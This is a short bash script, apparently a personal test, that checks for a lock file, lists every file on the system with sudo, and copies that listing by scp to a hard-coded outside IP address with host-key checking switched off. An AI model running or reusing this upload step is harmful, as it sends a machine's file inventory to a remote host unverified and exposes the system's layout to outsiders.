#!/bin/bash

FILE=wait.txt

if [ -f $FILE ]; then
    /usr/bin/sudo echo "File $FILE does exist. I will wait for it to disaper..." >> log.txt
else
    /usr/bin/sudo echo "File not found! Good !!!!" >> log.txt
    /usr/bin/sudo touch wait.txt
    /usr/bin/sudo /usr/bin/find / "*.*" > lista.txt
    /usr/bin/sudo /usr/bin/scp -i inicial-pruebas.pem -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null  lista.txt ubuntu@54.241.82.49:/home/ubuntu/
    /usr/bin/sudo rm -rf wait.txt
fi
